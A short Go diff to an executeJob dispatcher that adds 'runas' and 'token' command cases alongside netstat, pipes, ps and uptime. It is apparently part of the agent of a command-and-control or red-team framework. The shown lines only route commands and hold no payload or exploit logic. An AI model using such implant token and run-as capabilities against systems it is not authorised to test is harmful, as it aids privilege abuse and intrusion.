@@ -87,12 +87,16 @@ func executeJob() {
 					}
 				case "netstat":
 					result = commands.Netstat(job.Payload.(jobs.Command))
+				case "runas":
+					result = commands.RunAs(job.Payload.(jobs.Command))
 				case "pipes":
 					result = commands.Pipes()
 				case "ps":
 					result = commands.PS()
 				case "uptime":
 					result = commands.Uptime()
+				case "token":
+					result = commands.Token(job.Payload.(jobs.Command))
 				default:
 					result.Stderr = fmt.Sprintf("unknown module command: %s", job.Payload.(jobs.Command).Command)
 				}
